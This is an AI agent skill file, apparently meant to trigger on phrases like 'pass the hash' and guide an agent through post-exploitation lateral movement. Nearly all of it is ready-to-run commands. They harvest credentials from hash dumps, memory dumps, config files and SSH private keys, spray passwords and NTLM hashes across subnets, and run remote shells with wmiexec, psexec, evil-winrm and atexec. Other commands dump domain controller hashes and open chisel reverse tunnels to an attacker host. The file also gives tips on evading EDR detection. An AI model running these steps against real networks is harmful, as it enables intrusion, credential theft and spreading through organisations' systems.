---
name: post-lateral-movement
description: "Lateral movement skill for post-exploitation. Credential spraying, pass-the-hash, WMI/SMB/WinRM execution, SSH key pivoting, and internal network traversal. Triggers: 'lateral movement', 'pass the hash', 'pth', 'credential spray', 'internal pivot', 'move laterally', 'spread access', 'wmiexec', 'psexec', 'evil-winrm'."
---

# Lateral Movement

Credential spray before anything else — saves time and maps reachable hosts. WMI-based approaches provide better EDR evasion than service-installation methods.

## Phase 1: Credential Inventory

Collect discovered credentials before moving:
```bash
cat secretsdump.txt | grep ":::" | cut -d: -f1,4  # username:NTLM_hash

strings lsass.dmp | grep -i "password\|passwd" 

find /opt /var /srv -name "*.conf" -o -name "*.env" -o -name "*.ini" 2>/dev/null | \
  xargs grep -l "password\|passwd\|secret\|credential" 2>/dev/null
```

## Phase 2: Network Mapping

```bash
arp -a
cat /etc/hosts
ip route show
cat /proc/net/arp

nmap -sn 10.0.0.0/24 --min-rate 1000 -oG sweep.txt 2>/dev/null
nmap -sn 192.168.1.0/24 --min-rate 1000 | grep "Nmap scan"

nmap -p 22,80,443,445,139,3389,5985,5986 -iL live_hosts.txt --open -oG open_ports.txt

crackmapexec smb 10.0.0.0/24 --gen-relay-list live_smb.txt 2>/dev/null
```

## Phase 3: Credential Spraying

```bash
crackmapexec smb <subnet>/24 -u <user> -p <password>
crackmapexec smb <subnet>/24 -u users.txt -p passwords.txt --no-bruteforce

crackmapexec winrm <subnet>/24 -u <user> -p <password>

crackmapexec ssh <subnet>/24 -u <user> -p <password>

crackmapexec smb <subnet>/24 -u <user> -H <ntlm_hash>
crackmapexec winrm <subnet>/24 -u <user> -H <ntlm_hash>

crackmapexec smb <subnet>/24 -u Administrator -H <local_admin_hash> --local-auth
```

## Phase 4: Remote Execution Methods

**WMI (preferred — no service installation, lower detection):**
```bash
wmiexec.py '<domain>/<user>:<password>@<target_ip>'
wmiexec.py -hashes ':<ntlm_hash>' '<domain>/<user>@<target_ip>'

wmiexec.py '<user>:<password>@<target_ip>' 'whoami'
```

**PSExec (SYSTEM shell via SMB — noisier):**
```bash
psexec.py '<domain>/<user>:<password>@<target_ip>'
psexec.py -hashes ':<ntlm_hash>' '<domain>/<user>@<target_ip>'
```

**Evil-WinRM (most interactive — requires WinRM port 5985/5986):**
```bash
evil-winrm -i <target_ip> -u <user> -p <password>
evil-winrm -i <target_ip> -u <user> -H <ntlm_hash>

evil-winrm -i <target_ip> -u <user> -H <ntlm_hash> -e /local/exec/path -s /local/scripts/
```

**atexec (scheduled task execution — evades some detections):**
```bash
atexec.py '<domain>/<user>:<password>@<target_ip>' 'whoami > C:\output.txt'
atexec.py -hashes ':<ntlm_hash>' '<domain>/<user>@<target_ip>' 'net user'
```

## Phase 5: Credential Extraction on New Host

```bash
secretsdump.py '<domain>/<user>:<password>@<target_ip>'
secretsdump.py -hashes ':<ntlm_hash>' '<domain>/<user>@<target_ip>' \
  -outputfile <target_ip>_hashes

secretsdump.py '<domain>/<user>:<password>@<dc_ip>' -just-dc \
  -outputfile dc_hashes

secretsdump.py '<domain>/<user>@<target_ip>' -hashes ':<hash>' -outputfile lsa_secrets
```

## Phase 6: Linux → Linux Pivoting

```bash
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
cat ~/.ssh/id_rsa  # Private key

cat ~/.ssh/known_hosts
cat /home/*/.ssh/known_hosts 2>/dev/null

echo $SSH_AUTH_SOCK
ssh-add -l  # List keys in agent

for host in $(cat known_hosts | cut -d' ' -f1 | sort -u); do
  ssh -i /tmp/harvested_key -o StrictHostKeyChecking=no \
      -o ConnectTimeout=3 -q user@$host id 2>/dev/null && echo "SUCCESS: $host"
done

for host in $(cat live_hosts.txt); do
  sshpass -p '<found_password>' ssh -o StrictHostKeyChecking=no \
    -o ConnectTimeout=3 <user>@$host id 2>/dev/null && echo "SUCCESS: $host"
done
```

## Phase 7: Tunneling & Pivoting Setup

```bash
./chisel server -p 8080 --reverse

./chisel client <attacker_ip>:8080 R:1080:socks

proxychains nmap -sT -p 22,80,443,3389,5985 10.10.10.0/24 -Pn

ssh -L 5985:<internal_host>:5985 <pivot_user>@<pivot_ip>
evil-winrm -i 127.0.0.1 -u <user> -p <password>

ssh -D 1080 <pivot_user>@<pivot_ip> -N -f
proxychains crackmapexec smb 10.0.0.0/24 -u <user> -H <hash>
```

## Validation (REQUIRED before reporting)

Document each hop:
1. Source host (hostname, IP, user context)
2. Credential used (type: password/hash/key, source)
3. Target host (hostname, IP)
4. Execution method (wmiexec/evil-winrm/psexec/ssh)
5. Evidence of access (whoami output, id output)

Map the full lateral movement chain as a diagram in the report.
